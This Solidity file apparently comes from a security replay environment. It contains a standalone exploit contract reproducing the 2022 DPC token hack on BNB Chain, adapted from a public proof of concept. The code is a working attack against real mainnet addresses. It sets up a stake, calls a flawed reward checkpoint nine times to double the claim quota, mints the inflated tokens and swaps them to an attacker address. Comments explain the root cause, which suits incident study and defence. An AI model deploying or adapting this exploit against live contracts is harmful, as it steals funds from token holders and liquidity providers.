// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-09-DPC).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker == address(this)), so there is no standalone contract to deploy. This
// file is a faithful, self-contained copy of that inline attack, split into:
//   - seed()    — unrecorded prep run from `setup`: wrap 2 BNB → USDT, buy DPC,
//                 pay the 100-USDT tokenAirdrop fee, add DPC/USDT liquidity,
//                 stake the LP. Mirrors steps 0–5 of the test's testExploit().
//   - attack()  — RECORDED: the 9-call reward-compounding loop, the
//                 claimDpcAirdrop mint, and the DPC→USDT→WBNB dump. Mirrors
//                 steps 7–9 of the test (after the vm.warp(+24h)).
// Because the playground replays the whole exploit at a SINGLE block timestamp,
// the test's `vm.warp(+24h)` between stake and claim is reproduced by: running
// `seed()` at the warped timestamp (setup.blockTimestamp = forkTs + 86400), then
// patching the DPC `dpcLpTime[exploit]` storage slot back down to the fork
// timestamp so the first recorded claimStakeLp accrues the full 24h reward
// window — exactly mirroring the SafeDollar PoC's single-timestamp replay fix.
//
// Logic and constants are copied verbatim from src/test/2022-09/DPC_exp.sol.
//
// Root cause: DPC.getClaimQuota() returns `timeComponent + oldClaimQuota`, but the
// permissionless checkpoint functions `claimStakeLp`/`stakeLp` do
// `oldClaimQuota += getClaimQuota()`, re-adding the already-banked balance into
// itself. After the first checkpoint advances the time anchor, every subsequent
// call doubles oldClaimQuota. Nine calls mint ~279.77 DPC out of thin air.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPair {
    function approve(address, uint256) external;
    function balanceOf(address) external returns (uint256);
}

interface IDPC {
    function approve(address, uint256) external;
    function balanceOf(address) external returns (uint256);
    function tokenAirdrop(address, address, uint256) external;
    function stakeLp(address, address, uint256) external;
    function claimStakeLp(address, uint256) external;
    function claimDpcAirdrop(address) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

contract DPCExploit {
    address constant ATTACKER = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496;
    IDPC constant DPC = IDPC(0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE);
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPair constant Pair = IPair(0x79cD24Ed4524373aF6e047556018b1440CF04be3);
    IPancakeRouter constant Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    // Unrecorded prep (run from setup.rawCall): acquire the airdrop quota + LP
    // position. Funded with 2 BNB by setup.fundAttackerWei (forwarded as msg.value
    // from the setup rawCall, hence payable). Mirrors steps 0–5 of the Foundry
    // testExploit() (wrap, two swaps, tokenAirdrop, addLiquidity, stakeLp). After
    // this the config patches dpcLpTime[address(this)] back to the fork timestamp
    // so the recorded attack accrues a full 24h reward slice.
    function seed() external payable {
        DPC.approve(address(Router), ~uint256(0));
        USDT.approve(address(DPC), ~uint256(0));
        USDT.approve(address(Router), ~uint256(0));
        Pair.approve(address(DPC), ~uint256(0));
        WBNB.approve(address(Router), ~uint256(0));

        address(WBNB).call{value: 2 ether}(""); // wrap 2 BNB → WBNB
        _wbnbToUsdt();
        _usdtToDpc();
        DPC.tokenAirdrop(address(this), address(DPC), 100); // pay 100 USDT → 500 DPC quota
        _addDPCLiquidity();
        DPC.stakeLp(address(this), address(DPC), Pair.balanceOf(address(this)));
    }

    // RECORDED entrypoint — the compounding loop + claim + dump. Mirrors steps
    // 7–9 of testExploit() (after vm.warp(+24h)).
    function attack() external {
        // Compounding loop: 9 permissionless re-checkpoints. After the first
        // call banks the 24h slice, every subsequent call doubles
        // oldClaimQuota (the time anchor advances, so the time component is 0,
        // and getClaimQuota returns 0 + oldClaimQuota, which is then added back
        // into oldClaimQuota). 2^8 * 1.0929 DPC = 279.77 DPC.
        for (uint256 i = 0; i < 9; i++) {
            DPC.claimStakeLp(address(this), 1);
        }

        // Mint the inflated quota straight to this contract from the DPC reserve.
        DPC.claimDpcAirdrop(address(this));

        // Dump the minted DPC for WBNB (DPC -> USDT -> WBNB), routed to the attacker.
        address[] memory path = new address[](3);
        path[0] = address(DPC);
        path[1] = address(USDT);
        path[2] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            DPC.balanceOf(address(this)), 0, path, ATTACKER, block.timestamp
        );
    }

    function _wbnbToUsdt() private {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        Router.swapExactTokensForTokens(WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp);
    }

    function _usdtToDpc() private {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(DPC);
        Router.swapExactTokensForTokens(USDT.balanceOf(address(this)) / 2, 0, path, address(this), block.timestamp);
    }

    function _addDPCLiquidity() private {
        Router.addLiquidity(
            address(USDT),
            address(DPC),
            USDT.balanceOf(address(this)),
            DPC.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}
